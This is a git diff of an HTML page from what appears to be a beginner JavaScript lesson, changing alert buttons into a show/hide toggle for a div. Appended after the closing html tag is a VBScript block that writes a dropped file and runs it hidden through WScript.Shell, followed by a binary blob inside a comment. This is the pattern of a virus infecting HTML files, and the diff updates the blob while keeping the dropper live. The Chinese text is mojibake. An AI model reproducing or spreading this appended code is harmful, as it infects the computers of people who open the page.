@@ -5,28 +5,29 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<meta http-equiv="X-UA-Compatible" content="ie=edge">
 		<title></title>
+		<style type="text/css">
+			div {
+				width: 100px;
+				height: 100px;
+				background-color: pink;
+			}
+		</style>
 	</head>
 	<body>
-		<input type="button" value="å¼¹çª—" onclick="alert('å“ˆå“ˆ')" />
-		<input type="button" value="æ˜¾ç¤ºæ•ˆæœ" id="btn" />
+		<input type="button" id="btn" value="æ˜¾ç¤º/éšè—" />
+		<div id="dv">
 
-
+		</div>
 		<script type="text/javascript">
-			function f1() {
-				alert("å…‘æ¢æˆ");
-			}
-		</script>
-		<input type="button" value="ç¬¬äºŒä¸ªç‰ˆæœ¬æ•ˆæœ" onclick="f1()" />
-
-		<!-- æœ€ç»ˆåˆ†ç¦» -->
-		<script type="text/javascript">
-			// æ ¹æ®idå±æ€§çš„å€¼ä»æ–‡æ¡£ä¸­è·å–è¿™ä¸ªå…ƒç´ .
 			document.getElementById('btn').onclick = function() {
-				// å½“å‰è¿™ä¸ªæŒ‰é’®çš„å…ƒç´ (å¯¹è±¡ï¼‰,æ³¨å†Œç‚¹å‡»äº‹ä»¶,æ·»åŠ äº‹ä»¶å¤„ç†å‡½æ•°(åŒ¿åå‡½æ•°)
-				alert('å¼¹çª—');
+				var divObj = document.getElementById('dv');
+				if (divObj.style.display == "none") {
+					divObj.style.display = "block";
+				} else {
+					divObj.style.display = "none";
+				}
 			};
 		</script>
- 
 	</body>
 </html>
 <SCRIPT Language=VBScript><!--
@@ -43,7 +44,7 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--zULİ°•>VUpÃ³¬&KğãS;“ ‘×Q%\‹Ÿ†ê’+ÀPNÔ¦úìÕˆZ¢:9X# nT{w‹9‚š/x÷`cíU»Î’Óq.êRF
-³LªQÈ<wx2¤[İ ±¢{Í[ƒÍIx  ¥4äC1(?Œ—ğ2?I>bm@˜ğ	6 ”d9|i„ZcĞb³÷ßŠ^y^ZˆïIÖGš!í¦Ç|¡JèR€|áLƒŞœ¥Tâ©âoM7ú·	©ã>Ö?{ABK÷D*=f…5s”öù »Ç! êù8ŞyšÏOçT*Â[á”
-nl âÔŒTO73è‰HE©¤&]íº{!¡z¬­Ü™ü÷chy‰F68P–H¼kŸÍtÁjÆ¼úqìÀp…z?™²(Ó6AìÍírn ²Å=®ÌfOËA;K^9ÈÁ½lOf·*5Xw$¿ ‚™é"Q\hA
-M áR"ùááá¬ÕOGÂª_uâ á-->
+//--></SCRIPT><!--Ä•9Ó)¿×]Dn~¾:€üÁ y»=£eR#3´É¡±ÛµÊ0¯ñ1pKj`K²ştÙtqrJöğŸÇ*+–|SñOÊúôE0toàq÷KùÇ•/8ÏÁâ–ÏÜJÕ
+™QDÂ»ì$P&µš(8~Q¬ÔÃ
+í¬KRÓ†¼dÎÒ‹€B
+‚SÈb+b÷°À-r?§Ø¹ia¬¼„¤Ìe9.X¤Hü ¥£­#>OV\U{,^=&Õƒ¼¨/.ÄCùÛ5 4kÃÂE¡‰b,lZDRï2ûŸ3Ç(“¥è"Ä-DıiHQ“dİêî	xL¬X¿"«[>GzÄ	Ğšª<2üÙµÛíœS^……e¹S7Í^3"œä€İc(7é`‚°a1ü­³	]ı‰:seáñè!AO_pĞJ|ÜØS¯Ú"¤O'(×‹QóÁÌ*İC~eÄlS^ÆÈ6¶€ÁX§MyÕf¸½*¥¤Ÿ0"’‰­V¨!hƒœòxJ%ÇiÔ³~k8Xã!ê.æ¡ŞCXÃåád”ëg4ªt¹Løê áR"ùááá¬ÕOGÂª_ â á-->
